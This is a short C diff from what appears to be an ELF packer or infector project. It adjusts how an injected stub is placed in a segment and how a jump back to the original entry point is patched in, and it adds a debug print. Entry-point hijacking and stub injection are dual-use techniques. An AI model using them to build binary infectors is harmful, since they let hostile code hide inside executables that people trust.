@@ -14,10 +14,11 @@ SY_sha256( char *str, size_t len, char *output ) {
 
 static inline void set_payload(t_elf const *elf)
 {
-	Elf64_Addr const entry_point = elf->old_entrypoint - (elf->segment_addr + elf->segment_size) - elf->size_stub;
+	Elf64_Addr const entry_point = elf->old_entrypoint - (elf->segment_addr + elf->segment_size) - elf->tmp;
 
-	elf->stub[ elf->size_stub - ( sizeof( int ) + 1) ] = 0XE9;
-	memcpy(&elf->stub[elf->size_stub -  sizeof( int ) ], &entry_point, sizeof(int));
+	printf("%ld - %ld\n", elf->tmp, elf->size_stub);
+	elf->stub[ elf->tmp - ( sizeof( int ) + 1) ] = 0XE9;
+	memcpy(&elf->stub[elf->tmp -  sizeof( int ) ], &entry_point, sizeof(int));
 }
 
 static void write_on_memory(t_elf const *elf, char *ptr)
@@ -34,6 +35,7 @@ static void write_on_memory(t_elf const *elf, char *ptr)
 
 	while (index < beg_payload)
 	{
+
 		*dst++ = *src++;
 		index++;
 	}
@@ -48,7 +50,7 @@ static void write_on_memory(t_elf const *elf, char *ptr)
 		index++;
 	}
 
-	memcpy(ptr + beg_payload, elf->stub, elf->size_stub + elf->n);
+	memmove((ptr + beg_payload), elf->stub, elf->size_stub + elf->n);
 	//_rc4(key, _strlen((char *)key), ptr + beg_encrypt, end_encrypt - beg_encrypt);
 }
 
